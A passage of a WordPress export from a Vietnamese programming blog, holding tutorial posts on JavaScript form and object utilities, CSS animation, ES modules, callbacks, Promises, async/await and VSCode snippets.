            dir = dir + "." + arr[i];
            if (eval('!' + dir)) {
                return false;
            }
        }
        return true;
    }
    static searchValueExists(object, value) {
        let find = false;
        let searchObj = (object, value) => {
            if (find) return;
            if (Object.prototype.toString.call(object) == "[object Object]") {
                for (let key in object) {
                    searchObj(object[key], value)
                }
            }
            else {
                let val = object.toString().toUpperCase();
                if (val.indexOf(value.toUpperCase()) > -1) {
                    find = true;
                }
            }
        }
        searchObj(object, value);
        return find;
    }
    static getValueByDirect(object, direct) {
        if (typeof direct == "string") {
            if (MyObject.checkDirectExists(object, direct)) {
                return eval('object.' + direct);
            }
        }
        else if (typeof direct == "function") {
            return direct(object);
        }
        return;
    }
    static setValueByDirect(object, direct, value) {
        let strToArr = (str) => {
            //quy định: [5]: array, ["5"]: object
            let arr = str.split(/\[|\]|\./);
            let rs = arr.reduce((acc, item) => {
                if (/^[0-9]+$/.test(item)) item = Number(item);
                if (item !== "") acc.push(item);
                return acc;
            }, [])
            return rs;
        }
        let addProps = (obj, arr, val) => {
            if (arr.length > 1) {
                if (typeof arr[1] == 'string') {
                    obj[arr[0]] = obj[arr[0]] || {};
                }
                if (typeof arr[1] == 'number') {
                    obj[arr[0]] = obj[arr[0]] || [];
                }
                let temp = obj[arr[0]];
                arr.shift();
                addProps(temp, arr, val);
            }
            else {
                obj[arr[0]] = val;
            }
            return obj;
        }
        if (typeof direct == 'string') direct = strToArr(direct);
        if (Array.isArray(direct)) {
            return addProps(object, direct, value);
        }
    }
    static cleanUndefined(object) {
        object = JSON.parse(JSON.stringify(object));
        if (Array.isArray(object)) {
            let array = object.reduce((acc, item) => {
                if (item) {
                    item = MyObject.cleanUndefined(item)
                    acc.push(item);
                }
                return acc;
            }, [])
            return array;
        }
        if (Object.prototype.toString.call(object) == "[object Object]") {
            for (let key in object) {
                object[key] = MyObject.cleanUndefined(object[key])
            }
            return object;
        }
        else {
            return object;
        }
    }
}
class MyForm {
    static getData(elm) {
        let data = {},
            ipString = elm.querySelectorAll('input[type=text],input[type=password],select'),
            ipNumber = elm.querySelectorAll('input[type=number]'),
            ipDate = elm.querySelectorAll('input[type=date]');
        ipString.forEach((item, index) => {
            MyObject.setValueByDirect(data, item.name, item.value)
        })
        ipNumber.forEach((item, index) => {
            MyObject.setValueByDirect(data, item.name, Number(item.value))
        })
        ipDate.forEach((item, index) => {
            if (item.value == "") return;
            let temp = (new Date(item.value)).getTime();
            MyObject.setValueByDirect(data, item.name, temp)
        })
        data = MyObject.cleanUndefined(data);
        return data;
    }
    static setData(object, elm) {
        elm.reset();
        let ipString = elm.querySelectorAll('input[type=text],input[type=password],select'),
            ipNumber = elm.querySelectorAll('input[type=number]'),
            ipDate = elm.querySelectorAll('input[type=date]'),
            ipRadio = elm.querySelectorAll('input[type=radio]'),
            ipCheckbox = elm.querySelectorAll('input[type=checkbox]');

        ipString.forEach((item, index) => {
            if (item.name == "") return;
            item.value = MyObject.getValueByDirect(object, item.name);
        })
        ipNumber.forEach((item, index) => {
            if (item.name == "") return;
            let temp = MyObject.getValueByDirect(object, item.name);
            if (!temp) return;
            if (item.getAttribute("data-money") == "vnd") {
                item.value = temp.toFixed(3)
            }
            else {
                item.value = temp
            }
        })
        ipDate.forEach((item, index) => {
            if (item.name == "") return;
            let temp = MyObject.getValueByDirect(object, item.name);
            if (!temp) return;
            item.value = MyDateTime.format(temp, "YYYY-MM-DD");
        })
        ipRadio.forEach((item, index) => {
            if (item.name == "") return;
            if (item.value == MyObject.getValueByDirect(object, item.name)) {
                item.checked = true;
            }
        })
        ipCheckbox.forEach((item, index) => {
            if (item.name == "") return;
            if (MyObject.getValueByDirect(object, item.name).includes(item.value)) {
                item.checked = true;
            }
        })
    }
    static autoCompleteMoney(ipNumElement) {
        ipNumElement.value = Number(ipNumElement.value).toFixed(3);
    }
}
class MyNodeList {
    static groupByAttribute(nodelist, attr) {
        return Object.values(nodelist).reduce((acc, value) => {
            let key = value.getAttribute('data-id');
            (acc[key] = acc[key] || []).push(value);
            return acc;
        }, {})
    }
}
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>865</wp:post_id>
		<wp:post_date><![CDATA[2021-02-03 22:59:29]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-02-03 15:59:29]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-03-16 21:04:50]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-03-16 21:04:50]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[myclass-nhung-class-hay-nhat-cua-duycode-com]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						</item>
					<item>
		<title><![CDATA[CSS - Animation xoay tròn]]></title>
		<link>https://duycode.com/2021/02/19/css-animation-xoay-tron/</link>
		<pubDate>Fri, 19 Feb 2021 15:46:36 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=873</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
.loading {
                    width: 20px;
                    height: 20px;
                    margin: 0 auto;
                    border-radius: 50%;
                    border-top: 2px solid aqua;
                    border-bottom: 2px solid blueviolet;
                    border-left: 2px solid #03A9F4;
                    border-right: 2px solid #FFEB3B;
                    animation: rotate360 0.5s linear 0s infinite;
}
@keyframes rotate360 {
                    from {transform: rotate(0deg);}
                    to {transform: rotate(360deg);}
}
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>873</wp:post_id>
		<wp:post_date><![CDATA[2021-02-19 22:46:36]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-02-19 15:46:36]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-02-19 22:46:36]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-02-19 15:46:36]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[css-animation-xoay-tron]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="css"><![CDATA[CSS]]></category>
						</item>
					<item>
		<title><![CDATA[JS Module – 2. ESM: Ecmascript Module Syntax]]></title>
		<link>https://duycode.com/2021/01/01/js-module-2-esm-ecmascript-module-syntax/</link>
		<pubDate>Thu, 31 Dec 2020 19:00:05 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1038</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>A. Cú pháp</h2>
<pre>
// Name export/import
export const name = 'value';
import { name } from '/module/my-module.js';

// Default export/import
export default 'value';
import anyName from '/module/my-module.js';

// Rename import
export { name as newName };
import { newName } from '/module/my-module.js';

// Export list + rename | Import list + rename
export { name1, name2 as newName2 };
import { name1 as newName1, newName2 } from '/module/my-module.js';

// Named export + default export | Import all module's contents
export const name = 'value';
export default 'defaultValue';
import * as anyName from '/module/my-module.js';
console.log(anyName); // Module { name: 'value', default: 'defaultValue' }
console.log(anyName.name); // 'value'
console.log(anyName.default); // 'defaultName'

// Default + Named export
export const name = 'value1';
export default 'value2';
import anyName, { name } from '/modules/my-module.js';

// Export list => không phải là object nhé
const name1 = 'value1';
const name2 = 'value2';
export { name1, name2 };

import { name1, name2 } from '/modules/my-module.js';
console.log(name1); // 'value1'
console.log(name2); // 'value2'

//Kết hợp import và export
//Thông thường
import logger from './logger.js' 
export default logger;
//Cách khác
export {default} from './logger.js'
export {default as debugger} from './logger.js'
</pre>

<h2>B. Sử dụng </h2>
<h3>1. Sử dụng trên CDN dạng type="module"</h3>
<pre>
<!DOCTYPE html>
<html lang="en">
<body>
    <script type="module">
        import {demoData} from '/demo-export.js'
        console.log(demoData);
    </script>
</body>
</html>

<!-- Tại file: /demo-export.js -->
<!-- export const demoData = {a: 2, b: 3} -->
</pre>

<h3>2. Sử dụng trên CDN với babel version 6</h3>
Nguồn: <a href="https://stackoverflow.com/questions/53972473/how-to-perform-import-export-in-client-side-react-jsx-using-babel-standalone/53975781#53975781" rel="noopener" target="_blank">https://stackoverflow.com/questions/53972473/how-to-perform-import-export-in-client-side-react-jsx-using-babel-standalone/53975781#53975781</a>
<pre>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>React JSX Babel-Standalone Import/Export Problem</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>


    <script data-plugins="transform-es2015-modules-umd" type="text/babel" src="./MyExport.js"></script>
    <script data-plugins="transform-es2015-modules-umd" type="text/babel">
        import MyExport from "./MyExport";
        const App = () => {
            return (
                <MyExport />
            );
        };
        ReactDOM.render(<App />, document.querySelector("#root"));
    </script>

    <!-- MyExport.js:
    const MyExport = () => {
        return (
            <div>MyExport element is imported!</div>
        );
    };
    export default MyExport;
    -->
</body>

</html>
</pre>

<h3>3. Sử dụng với babel 7</h3>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>React JSX Babel-Standalone Import/Export Problem</title>
</head>

<body>
    <div id="root"></div>
    <script crossorigin src="https://unpkg.com/react@17/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/@babel/standalone@7.11.4/babel.js"></script>


    <script data-plugins="transform-modules-umd" data-presets="react" data-type="module" type="text/babel" src="./MyExport.js"></script>
    <script data-plugins="transform-modules-umd" data-presets="react" data-type="module" type="text/babel">
        import MyExport from "./MyExport";
        const App = () => {
            return (
                <MyExport />
            );
        };
        ReactDOM.render(<App />, document.querySelector("#root"));
    </script>

    <!-- MyExport.js:
    const MyExport = () => {
        return (
            <div>MyExport element is imported!</div>
        );
    };
    export default MyExport;
    -->
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1038</wp:post_id>
		<wp:post_date><![CDATA[2021-01-01 02:00:05]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-31 19:00:05]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-01-01 02:00:05]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-12-31 19:00:05]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[js-module-2-esm-ecmascript-module-syntax]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						</item>
					<item>
		<title><![CDATA[JS Asynchronous: 3. Sử dụng Async await]]></title>
		<link>https://duycode.com/2021/01/02/js-asynchronous-3-su-dung-async-await/</link>
		<pubDate>Fri, 01 Jan 2021 20:00:07 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1377</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Async await là gì</h2>
- Hàm async luôn trả về 1 Promise
- Await chính là promise.then(res=>...). Kết quả của await chính là res của then trong promise 
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <script>
        async function async1() {
            console.log("async1 start")   // 2
            await async2();
            console.log("async1 end")     // 6
        }

        async function async2() {
            console.log("async2");         // 3
            return 5
        }

        console.log("script start")       //.start
        setTimeout(function () {
            console.log("setTimeout")     //.end
        }, 0);

        async1();

        new Promise(function (resolve) {
            console.log("promise1");      // 4
            resolve();
        }).then(function () {
            console.log("promise2");      // 7
        })

        console.log("script end")         // 5

    </script>
</body>

</html>
</pre>

<h2>Demo sử dụng Asyn await để Get Data</h2>
<pre>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<title>Document</title>
	</head>

	<body>
		<h2>Xử lý bất đồng bộ trong ES6</h2>
		<script>
			async function getFakeData() {
				try {
					let url = 'https://fakestoreapi.com/users?limit=5';
					let response = await fetch(url);
					let responseJSON = await response.json();
					console.log(responseJSON);
				} catch (error) {
					console.log('Failed to fetch data. ', error.message);
				}
			}
			let example = getFakeData();
			console.log(example);
		</script>
	</body>
</html>
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1377</wp:post_id>
		<wp:post_date><![CDATA[2021-01-02 03:00:07]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-01-01 20:00:07]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-01-02 03:00:07]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-01-01 20:00:07]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[js-asynchronous-3-su-dung-async-await]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						</item>
					<item>
		<title><![CDATA[JS Asynchronous: 1. Vấn đề Callback Hell]]></title>
		<link>https://duycode.com/2021/01/02/js-asynchronous-1-van-de-callback-hell/</link>
		<pubDate>Fri, 01 Jan 2021 18:00:39 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1431</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Sử dụng Callback</h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <h2>Xử lý bất đồng bộ trong ES6</h2>
    <script>
        // Giả sử gặp bài toán tính diện tích hình thang, với 2 cạnh a,b và chiều cao h. Bình thường làm đơn giản như sau
        // let square = (a, b, h) => (a + b) * h / 2;

        // Để mô hình hóa xử lý bất động bộ, ta giả sử các phép toán "+", "*" và "/" là các phép toán bất đồng bộ với setTimeout 1000ms
        let add = (a, b, callback) => {
            setTimeout(() => {
                if (typeof a != 'number' || typeof b != 'number') {
                    return callback("Phép cộng phải có kiểu Number")
                }
                callback(undefined, a + b);
            }, 1000);
        }

        let multiply = (a, b, callback) => {
            setTimeout(() => {
                if (typeof a != 'number' || typeof b != 'number') {
                    return callback("Phép nhân phải có kiểu Number")
                }
                callback(undefined, a * b);
            }, 1000);
        }

        let divide = (a, b, callback) => {
            setTimeout(() => {
                if (typeof a != 'number' || typeof b != 'number') {
                    return callback("Phép chia phải có kiểu Number")
                }
                if (b === 0) {
                    return callback("Phép chia cho 0")
                }
                callback(undefined, a / b);
            }, 1000);
        }

        // Kiểm tra thử 1 hàm ở trên
        // add(4, 2, (err, res) => {
        //     if (err) return console.log("Lỗi: ", err);
        //     console.log('Kết quả: ', res);
        // })

        let squareHinhThang = (a, b, h, g = 2, callback) => {
            add(a, b, (err, res) => {
                if (err) return callback(err);
                multiply(res, h, (err, res) => {
                    if (err) return callback(err);
                    divide(res, 2, (err, res) => {
                        if (err) return callback(err);
                        callback(undefined, res);
                    })
                })
            })
        }

        //Kết quả phép toán tính diện tích hình thang:
        squareHinhThang(4, 3, 6, 2, (err, res) => {
            if (err) return console.log("Lỗi: ", err);
            console.log('Diện tích hình thang là: ', res);
        })

    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1431</wp:post_id>
		<wp:post_date><![CDATA[2021-01-02 01:00:39]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-01-01 18:00:39]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-01-02 01:00:39]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-01-01 18:00:39]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[js-asynchronous-1-van-de-callback-hell]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						</item>
					<item>
		<title><![CDATA[JS Asynchronous: 2. Sử dụng Promise]]></title>
		<link>https://duycode.com/2021/01/02/es6-xu-ly-bat-dong-bo-2-su-dung-promise/</link>
		<pubDate>Fri, 01 Jan 2021 19:00:40 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1442</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Promise là gì</h2>
<pre>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<title>Document</title>
	</head>

	<body>
		<h2>Xử lý bất đồng bộ trong ES6</h2>
		<script>
			let equal = (a, b) => {
				return new Promise((resolve, reject) => {
					setTimeout(() => {
						if (a === b) {
							resolve('message_success');
						} else {
							reject('message_error');
						}
					}, 200);
				});
			};

			// 1. Có 3 trạng thái của Promise: pending, fulfilled, rejected
			let example1 = equal(4, 4);
			let example2 = equal(3, 5);
			console.log(example1); // Trạng thái "pending" => do chưa trả về resolve hoặc reject
			console.log(example2); // Như trên
			setTimeout(() => {
				console.log(example1); // Trạng thái "fulfilled" => do đã trả về resolve
				console.log(example2); // Trạng thái "rejected" => do đã trả về reject
			}, 500);

			// 2. ".then" luôn trả về 1 Promise.
			// Cần chú ý  Có thể xử lý Promise theo 2 cách
			example1.then(
				//Có thể xử lý bắt lỗi bên trong then
				//Trường hợp này, nếu có lỗi xảy ra ==> hàm .then vẫn đi tiếp nếu có .then tiếp theo
				(res) => {
					console.log('Trạng thái thành công, ' + res);
				},
				(err) => {
					console.log('Trạng thái thất bại, ' + err);
				}
			);

			example2
				//Có thể xử lý bắt lỗi bằng hàm ".catch"
				//Trường hợp này, nếu có lỗi xảy ra ==> bỏ qua các ".then" tiếp theo mà vào thẳng ".catch"
				.then((res) => {
					console.log('Trạng thái thành công, ' + res);
				})
				.catch((err) => {
					console.log('Trạng thái thất bại, ' + err);
				})
				.finally(() => {
					console.log('Finally '); //Luôn luôn được chạy
				});
		</script>
	</body>
</html>

</pre>

<h2>2. Bài toán tính diện tích hình thang </h2>
<pre>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <h2>Xử lý bất đồng bộ trong ES6</h2>
    <script>
        let add = (a, b) => {
            return new Promise((resolve, reject) => {
                setTimeout(() => {
                    if (typeof a != 'number' || typeof b != 'number') {
                        return reject("Phép cộng phải có kiểu Number")
                    }
                    resolve(a + b);
                }, 1000);
            })
        }

        let multiply = (a, b) => {
            return new Promise((resolve, reject) => {
                setTimeout(() => {
                    if (typeof a != 'number' || typeof b != 'number') {
                        return reject("Phép nhân phải có kiểu Number")
                    }
                    resolve(a * b);
                }, 1000);
            })
        }

        let divide = (a, b) => {
            return new Promise((resolve, reject) => {
                setTimeout(() => {
                    if (typeof a != 'number' || typeof b != 'number') {
                        return reject("Phép chia phải có kiểu Number")
                    }
                    if (b === 0) {
                        return reject("Phép chia cho 0")
                    }
                    resolve(a / b);
                }, 1000);
            })
        }

        //Kiểm tra thử 1 hàm ở trên
        // add(4, 0).then(
        //     (res) => { console.log('Kết quả: ' + res) },
        //     (err) => { console.log('Lỗi: ' + err) }
        // )

        //Bài toán làm phép tính: (a + b) * h / 2;



        let squareHinhThang = (a, b, h, g = 2) => {
            //Nếu Reject ==> hàm vẫn tiếp tục .then tiếp (lí do: .then => sẽ trả về Promise)
            add(a, b)
                .then(
                    //nếu Resolve ==> kết quả trả về "multiply(res, 3)" ==> vẫn là 1 Promise ==> có thể then tiếp
                    (res) => multiply(res, h),
                    (err) => { console.log('Lỗi: ' + err) }
                )
                .then(
                    //nếu resolve ==> kết quả trả về "divide(res, 2)" ==> vẫn là 1 Promise ==> có thể then tiếp
                    (res) => divide(res, g),
                    (err) => { console.log('Lỗi: ' + err) }
                )
                .then(
                    (res) => { console.log('Kết quả: ' + res) },
                    (err) => { console.log('Lỗi: ' + err) }
                )
        }

        let squareHinhThang2 = (a, b, h, g = 2) => {
            //Để ngắn gọn hơn, các Promise liên tiếp không cần khai báo các hàm Reject ==> tạo ra .catch(err)
            //Nếu gặp Reject ==> bỏ qua các then tiếp theo ==> vào thằng hàm .catch(err)
            add(a, b)
                .then((res) => multiply(res, h))
                .then((res) => divide(res, g))
                .then((res) => { console.log('Kết quả: ' + res) })
                .catch((err) => { console.log('Lỗi: ' + err) })
        }

        squareHinhThang2(3, 4, 5)
    </script>
</body>

</html>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1442</wp:post_id>
		<wp:post_date><![CDATA[2021-01-02 02:00:40]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-01-01 19:00:40]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-01-02 02:00:40]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-01-01 19:00:40]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[es6-xu-ly-bat-dong-bo-2-su-dung-promise]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						</item>
					<item>
		<title><![CDATA[VSCode - 2. Snippets]]></title>
		<link>https://duycode.com/2021/01/01/vscode-2-snippets/</link>
		<pubDate>Thu, 31 Dec 2020 19:00:48 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1628</guid>
		<description></description>
		<content:encoded><![CDATA[*** Tạo snippets mới cho VSCode
-- Vào File >> Preferences >> User snippets >> New Global snippets file ...
<h2>1. Snippets for HTML5
<pre>
{
  "Create <table></table>": {
    "scope": "html",
    "prefix": "table",
    "body": [
      "<table>",
      "\t<thead>",
      "\t\t<tr>",
      "\t\t\t<th>#</th>",
      "\t\t\t<th>$0</th>",
      "\t\t</tr>",
      "\t</thead>",
      "\t<tbody>",
      "\t\t<tr>",
      "\t\t\t<td></td>",
      "\t\t</tr>",
      "\t</tbody>",
      "</table>"
    ],
    "description": "Create <table></table>"
  }
}

</pre>

<h2>2. Snippets for Javascripts </h2>
<pre>
{
  "$('element').": {
    "scope": "javascript",
    "prefix": "$",
    "body": ["$('$1').$0"],
    "description": "Use const $"
  },

  "const $ = document.querySelector.bind(document)": {
    "scope": "javascript,html",
    "prefix": "$",
    "body": ["const $ = document.querySelector.bind(document);", "$0"],
    "description": "Create const $"
  }
}
</pre>

<h2>3. Snippets for VueJS </h2>
<pre>
{
	"Default Vue": {
		"scope": "vue",
		"prefix": ["vue", "cvue"],
		"body": [
			"<template>",
			"\t<div>",
			"\t\t$0",
			"\t</div>",
			"</template>",
			"",
			"<script>",
			"export default {",
			"\tdata() {",
			"\t\treturn {",
			"\t\t\t",
			"\t\t}",
			"\t},",
			"",
			"\tmethods: {",
			"\t\t",
			"\t},",
			"}",
			"</script>",
			"",
			"<style scoped>",
			"\t",
			"</style>"
		],
		"description": "Demo file Vue "
	}
}
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1628</wp:post_id>
		<wp:post_date><![CDATA[2021-01-01 02:00:48]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-31 19:00:48]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-01-01 02:00:48]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-12-31 19:00:48]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[vscode-2-snippets]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="applications"><![CDATA[Applications]]></category>
						</item>
					<item>
		<title><![CDATA[JS Module - 1. Phân loại Module trong javascript]]></title>
		<link>https://duycode.com/2021/01/01/js-module-1-phan-loai-module-trong-javascript/</link>
		<pubDate>Thu, 31 Dec 2020 18:00:34 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1784</guid>
		<description></description>
		<content:encoded><![CDATA[Các loại module của javascript:
- IIFE: Immediately Invoked Function Expression
- ESM Browser - Ecmascript Module
- ESM Server - Ecmascript Module
- CJS - CommonJS
- AMD (cách cũ) - Asynchronous Module Definition
- UMD - Universal Module Definition: dân chơi dùng được cả trên server lẫn trình duyệt

<h2> 2. ESM Browser - Ecmascript Module </h2>
- Sử dụng trên trình duyệt:
- Bắt buộc khai báo phải có: type="module"
- Import thư viện khác: phải có địa chỉ cụ thể
<pre>
<blockquote>
<!DOCTYPE html>
<html lang="en">
<body>
    <h1>Javascript Modules</h1>
    <script type="importmap">
        { 
            "imports": {
                "vue":        "https://cdnjs.cloudflare.com/ajax/libs/vue/3.0.0-beta.14/vue.esm-browser.js",
                "main":        "./main.js"
            }
        }
        </script>
    <script type="module">
        import * as Vue from 'vue'
        import * as Main from 'main'
        import * as Vuex from 'https://cdnjs.cloudflare.com/ajax/libs/vuex/4.0.0-beta.2/vuex.esm-browser.js'
        import * as Compo from './Compo.js'
    </script>
</body>
</html>
</blockquote>

- Nếu import thư viện không có đường dẫn chính xác sẽ có lỗi
<blockquote>
import React fromt 'react'
Uncaught TypeError: Failed to resolve module specifier "react". Relative references must start with either "/", "./", or "../".
</blockquote>

- Nếu import nhầm sang thư viện của ESM server
<blockquote>
import * as Vue from 'https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.esm.js'
--> Uncaught ReferenceError: process is not defined
</blockquote>
</pre>

<h2>3. ESM Server </h2>
- Trong module này thường có thêm các biến của server: process.env, ... ==> nên mới không dùng được cho browser
- Import thư viện khi không có đường dẫn cụ thể
<blockquote>
import React fromt 'react'
--> tự động tìm trong folder node_modules
</blockquote>

<h2>4. CJS </h2>
- Thằng này cài trên server
- Cú pháp khác lắm nhé
<pre>
const jsonServer = require('json-server')
const fakeData = require('./fake-data')

module.exports = {
    data: '123456'
}
</pre>
- Run nó bằng: "node ./main.js"

<h2>5. UMD </h2>
- UMD được sử dụng cả trên server lẫn client, nên cú pháp phải đáp ứng được cả 2
- Thứ nhất: phải là cú pháp dạng IIFE
<pre>
(function (global, factory) {
    if (typeof exports === 'object' && typeof module !== 'undefined') {
        module.exports = factory()
    }
    else if (typeof define === 'function' && define.amd) {
        define(factory)
    }
    else {
        (global = global || self, global["module-name"] = factory());
    }
}(this, function () {
    'use strict';
}));
</pre>
- Thứ 2: ... chưa viết đc tiếp :D]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1784</wp:post_id>
		<wp:post_date><![CDATA[2021-01-01 01:00:34]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-12-31 18:00:34]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-01-01 01:00:34]]></wp:post_modified>
